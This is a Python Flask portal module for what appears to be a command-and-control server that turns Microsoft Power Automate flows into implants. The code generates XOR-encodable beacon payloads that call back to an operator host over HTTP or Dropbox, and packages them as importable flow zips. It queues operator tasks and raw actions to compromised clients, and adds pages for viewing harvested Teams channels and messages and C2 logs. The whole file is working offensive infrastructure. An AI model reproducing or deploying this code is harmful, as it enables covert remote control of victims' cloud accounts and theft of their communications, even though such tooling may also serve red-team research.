import os
import random
import json
from flask import Blueprint, Response, render_template, send_file, request, g, abort, jsonify
from flask import current_app as app
from flask_login import login_required
from app.services import client_service, connection_service, flowmanagement_service, task_service
from app.utils import validation
from pypowerautomate.actions import RawActions, ScopeStatement
from app.flow.beacon import BaseBeacon, HTTPBeacon, DropboxBeacon
from app.flow.payloads import *
from pypowerautomate.package import Package

portal = Blueprint("portal", __name__, template_folder="templates")


@portal.before_request
@login_required
def preprocess():
    g.client_id = request.args.get("client_id", "")


@portal.route("/", methods=["GET"])
def root():
    """
    root page
    """
    return "pac2 working!", 200


@portal.route("/portal", methods=["GET"])
def top():
    """
    ポータルトップ
    """
    return render_template("html/portal.html.j2")


@portal.route("/portal/initial", methods=["GET"])
def initial_payload():
    """
    イニシャルペイロードのダウンロード
    TODO: Initial Payloadの保持の仕方を決める
    """
    args = request.args
    flowmanagement_id = args.get('mngID')
    method = args.get('method')
    sendto = args.get('sendto')
    is_encoded = True if args.get('xor') else False
    payload: BaseBeacon = None
    package: Package = None

    # 0. Validation
    if method not in ["dropbox", "http"]:
        return abort(401)
    if method == "http" and not validation.is_valid_url(sendto):
        return abort(401)
    if method == "dropbox" and not validation.is_valid_32chars_hex(sendto):
        return abort(401)
    if not validation.is_valid_flowmanagement_connection_id(flowmanagement_id):
        if not validation.is_valid_32chars_hex(flowmanagement_id):
            return abort(401)

    # 1. FlowManagement情報がない場合は登録する
    flowmanagement = flowmanagement_service.get_flowmanagement_by_id(
        flowmanagement_id)
    if not flowmanagement:
        flowmanagement = flowmanagement_service.create_flowmanagement(
            flowmanagement_id)
    # 2. 新たなClientを登録し、clinet_idを発行する
    client = client_service.create_client(
        flowmanagement_id, method, sendto, is_encoded=is_encoded)
    # 3. Payloadを作成する
    payload = None
    if method == "http":
        payload = HTTPBeacon(flowmanagement_id, client.client_id, sendto, is_encoded, is_init=True)

    elif method == "dropbox":
        payload = DropboxBeacon(
            flowmanagement_id, client.client_id, sendto, is_encoded, is_init=True)
    # 4. Client情報にxor_keyとpayloadを登録
    xor_key = payload.get_xor_key()
    last_payload_json = payload.generate_flow().export_json()
    client_service.update_client(
        client.client_id, xor_key=xor_key, last_payload=last_payload_json)
    # 5. インポート用のZip作成
    package = Package(client.client_id, payload.generate_flow())
    package.set_flow_management_connector(flowmanagement_id)
    if method == "dropbox":
        package.set_dropbox_connector(sendto)

    download_file = package.export_zipfile("/tmp")

    return send_file(download_file, as_attachment=True)


@portal.route("/portal/client", methods=["GET"])
def client():
    """
    個別ユーザサマリ画面
    """
    client = client_service.get_client_by_id(g.client_id)
    if client:
        return render_template("html/client.html.j2", client_id=g.client_id, client=client.to_json())
    else:
        return f"Client ID {client} does not exist.", 404


@portal.route("/portal/client/payload", methods=["GET"])
def client_payload():
    """
    現在のペイロードのダウンロード
    """
    if request.method == 'GET' and g.client_id:
        # 1. clientのデータ取得
        is_init = request.args.get("init", False)
        client = client_service.get_client_by_id(g.client_id)
        method = client.method
        flowmanagement_id = client.flowmanagement_id
        c2_url = client.c2_connection
        is_encoded = client.is_encoded
        xor_key = client.xor_key

        # get application config
        sleep_time = app.config.get("SLEEP_TIME", 60)
        jitter = app.config.get("JITTER", 10)
        has_approval = app.config.get("SET_APPROVE_ACTION", True)

        # emailを取る
        email = None
        client = client_service.get_client_by_id(g.client_id)
        user = client.get_user()
        if user:
            email = user.email

        # init payload does not have enough connector info to set Approval Actions.
        if is_init:
            has_approval = False

        # 2. もととなるペイロードの生成
        beacon = HTTPBeacon(flowmanagement_id, g.client_id, c2_url, is_encoded, xor_key, is_init=False, sleep_time=sleep_time, jitter=jitter, has_approval=has_approval, email=email)

        # 3. 収集したConnection情報を元にbeaconのConnectionsを更新
        user = flowmanagement_service.get_user_for_flowmanagement(flowmanagement_id)
        if user:
            user_id = user.user_id
            connections = connection_service.get_connection_by_id(user_id)
            connections_data = json.loads(connections.data)
            beacon.set_connections_data(connections_data)
            beacon.update_connections()

        flow = beacon.generate_flow()

        # 4. DBのタスクに応じて、応答するflowにタスクを追加する。
        if not is_init:
            tasks = task_service.get_tasks_by_client_id_and_state(g.client_id, state="submitted")
            for task in tasks:
                payload = None
                # cls = globals().get(task.task_type+"Payload", None)
                if task.task_type == "Raw":
                    actions = RawActions(json.loads(task.task_raw))
                    flow.add_top_action(ScopeStatement(task.task_id,actions))
                else:
                    cls = PAYLOAD_MODULES.get(task.task_type+"Payload")
                    args = json.loads(task.task_args)
                    if cls:
                        payload = cls(**args, mode=method, task_id=task.task_id)
                        flow.add_top_action(payload.generate_payload())

        # Convert DeleteFlowAction to wait all until all task finish (similer to "await")
        # Find the edge nodes and termination node which is DeleteFlowAction
        action_name_set = set(flow.root_actions.nodes.keys()) # nodes connect to delete flow action. 
        delete_action = None # termination node

        if "root" in action_name_set:
            action_name_set.remove("root")

        for name, action in flow.root_actions.nodes.items():
            if action.runafter:
                for name in action.runafter.keys():
                    if name in action_name_set:
                        action_name_set.remove(name)

        for name in list(action_name_set):
            if isinstance(flow.root_actions.nodes[name],DeleteFlowAction):
                delete_action = name
                action_name_set.remove(delete_action)

        # update delete flow action
        if delete_action:
            for name in list(action_name_set):
                flow.root_actions.nodes[delete_action].runafter[name] = ['Succeeded', 'Failed', 'Skipped', 'TimedOut']

        # 5. Payloadを応答
        if is_encoded:
            return Response(flow.export_json(xor_key), 200)

        # print(json.dumps(flow.export(),indent=2))
        return jsonify(flow.export()), 200
    else:
        return jsonify({"message":"no client id"},404)


@portal.route("/portal/teams", methods=["GET"])
def portal_teams():
    """
    ポータル画面 Teams一覧表示
    """
    client = client_service.get_client_by_id(g.client_id)
    if client:
        return render_template("html/teams.html.j2", client_id=g.client_id, client=client.to_json())
    else:
        return f"Client ID {client} does not exist.", 404


@portal.route("/portal/channels", methods=["GET"])
def portal_channels():
    """
    ポータル画面 チャンネル一覧表示
    """
    return render_template("html/channels.html.j2", client_id=g.client_id)


@portal.route("/portal/messages", methods=["GET"])
def portal_messages():
    """
    ポータル画面 メッセージ一覧表示
    """
    return render_template("html/messages.html.j2", client_id=g.client_id)


@portal.route("/portal/log", methods=["GET"])
def portal_log():
    """
    ポータル画面 ログ表示
    """
    beacon_logfile = os.path.abspath(os.path.join(__file__, "..", "..", "log", "c2_access.log"))
    print(beacon_logfile)
    with open(beacon_logfile) as f:
        beacon_logs = f.read().split("\n")
        beacon_logs = list(map(lambda x: x.strip("\n"), beacon_logs))
        beacon_logs.reverse()
    
    worker_logfile = os.path.abspath(os.path.join(__file__, "..", "..", "log", "worker.log"))
    with open(worker_logfile) as f:
        worker_logs = f.read().split("\n")
        worker_logs = list(map(lambda x: x.strip("\n"), worker_logs))
        worker_logs.reverse()

    return render_template("html/log.html.j2", beacon_logs=beacon_logs, worker_logs=worker_logs)
